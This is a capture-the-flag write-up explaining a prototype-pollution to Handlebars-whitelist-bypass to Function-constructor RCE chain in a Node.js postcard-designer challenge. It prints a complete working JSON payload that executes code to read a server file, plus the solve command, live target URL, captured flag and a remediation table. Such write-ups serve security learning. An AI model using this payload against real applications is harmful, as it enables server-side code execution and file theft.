#   Do You Know Lika? — CTF Writeup

[![FortID CTF](https://img.shields.io/badge/Platform-FortID_CTF-blue)](https://ctf.fortid.com)
[![Category](https://img.shields.io/badge/Category-Web%2FPrototype_Pollution-orange)](https://github.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)](https://github.com)
[![Flag Format](https://img.shields.io/badge/Flag-FortID%7B...%7D-green)](https://github.com)

> **Prototype Pollution → Handlebars Whitelist Bypass → `Function` Constructor Default Parameter RCE**

---

##  Challenge Overview

| Field | Details |
|-------|---------|
| **Name** | Do You Know Lika? |
| **Platform** | FortID CTF (`inst9.ctf.fortid.com`) |
| **Category** | Web / Prototype Pollution / Template Injection |
| **Flag Format** | `FortID{...}` |
| **Objective** | Print the ranger's secret via the postcard designer preview API |

**Description:**
> The Lika Tourist Board has launched a postcard designer for visitors who think they know the region. Pick a theme, fill in the postcard data, and let a fresh print worker process prepare a preview.
>
> Can you print the ranger's secret?

---

## 🏗 Repository Structure

```
do-you-know-lika/
├── README.md                 # This writeup
├── handout/                  # Challenge source (provided)
│   ├── deploy/
│   │   └── Dockerfile
│   ├── src/
│   │   ├── server.js         # Express server + validation
│   │   ├── worker.js         # Handlebars rendering + mergeTheme
│   │   ├── templates/
│   │   │   └── postcard-layout.hbs
│   │   └── static/
│   │       ├── index.html
│   │       └── style.css
│   ├── package.json
│   └── flag.txt              # FortID{redacted}
├── exploit/
│   ├── solve.py              # Remote exploitation script
│   └── local_test.js         # Local reproduction
└── assets/
    └── response.json         # Captured API response
```

---

##  Methodology

### 1. Reconnaissance — Source Code Analysis

**Files of interest:**
- `src/server.js:49-79` — `validateJob()` / `containsBlockedKey()`
- `src/worker.js:13-23` — `mergeTheme()` recursive merge
- `src/worker.js:33-46` — `setLayoutOption` helper registration

**Key finding:** `containsBlockedKey` only blocks `__proto__`, not `constructor.prototype`.

```javascript
// server.js:39-40
if (key === "__proto__") {
  return true;
}
```

### 2. Vulnerability Chain Discovery

| Step | Component | Flaw |
|------|-----------|------|
| 1 | `mergeTheme` | Recurses into `constructor.prototype` → pollutes `Object.prototype` |
| 2 | Handlebars `createNewLookupObject` | Uses `for...in` + `hasOwnProperty` → copies polluted `allowedProtoMethods/Properties` into whitelist |
| 3 | `setLayoutOption` helper | Truthiness check `!writableProperties[key]` passes for inherited `toString` |
| 4 | `Function` constructor call | Second arg = `toString(context)` → empty string when `toString=String` |
| 5 | Default parameter | `Function("a=payload", "")` called with 0 args → payload executes |

### 3. Local Reproduction

```bash
# Setup
cd handout
npm ci --omit=dev

# Create flag file
mkdir -p /tmp/lika
echo "FortID{test_flag}" > /tmp/lika/flag.txt

# Run exploit
node exploit/local_test.js
```

**Output:**
```
THREW message: FortID{test_flag}
```

---

##  Exploitation

### Payload Construction

```json
{
  "template": "{{setLayoutOption theme.constructor.prototype key=\"toString\" value=theme.accent.constructor}}{{#with (theme.constructor.constructor \"a=(()=>{throw new Error(process.getBuiltinModule('fs').readFileSync('/tmp/lika/flag.txt','utf8'))})()\")}}{{this}}{{/with}}",
  "theme": {
    "accent": "#254f3d",
    "constructor": {
      "prototype": {
        "allowedProtoMethods": { "constructor": true },
        "allowedProtoProperties": { "constructor": true, "prototype": true }
      }
    }
  },
  "model": { "title": "hi", "message": "hi" }
}
```

### Remote Execution

```bash
python3 exploit/solve.py
```

**Response:**
```json
{
  "ok": false,
  "error": "FortID{L1K4_41R_1S_50_FR35H_Y0U_C4N_T45T3_TH3_P0LLUT10N_162ee9433e}\n"
}
```

---

##  Flag

```
FortID{L1K4_41R_1S_50_FR35H_Y0U_C4N_T45T3_TH3_P0LLUT10N_162ee9433e}
```

Verified via:
- Live target: `https://do-you-know-lika-3c81d72d3bfb.inst9.ctf.fortid.com/api/preview`
- Local reproduction with handout source

---

## 🛡 Root Cause & Remediation

| Vulnerability | Fix |
|---------------|-----|
| Prototype pollution in `mergeTheme` | Block `constructor` / `prototype` keys |
| Validation bypass | Extend `containsBlockedKey` to catch `constructor.prototype` |
| `setLayoutOption` writable check | Use `Object.hasOwn(writableProperties, key)` |
| Handlebars whitelist pollution | Freeze `Object.prototype` before rendering; use `Object.create(null)` + `Object.assign` with own props only |
| Defense in depth | Run worker with `--frozen-intrinsics` (Node.js 20+) |

```javascript
// Patched mergeTheme
function mergeTheme(target, source) {
  for (const [key, value] of Object.entries(source)) {
    if (["constructor", "prototype", "__proto__"].includes(key)) continue;
    // ... rest unchanged
  }
}
```

---

##  References

- [Handlebars Runtime Options — Prototype Access Control](https://handlebarsjs.com/api-reference/runtime-options.html#options-to-control-prototype-access)
- [Server-Side Prototype Pollution — PortSwigger Research](https://portswigger.net/research/server-side-prototype-pollution)
- [CVE-2021-23383 — Handlebars Prototype Pollution](https://nvd.nist.gov/vuln/detail/CVE-2021-23383)
- [Node.js `--frozen-intrinsics`](https://nodejs.org/api/cli.html#--frozen-intrinsics)

---
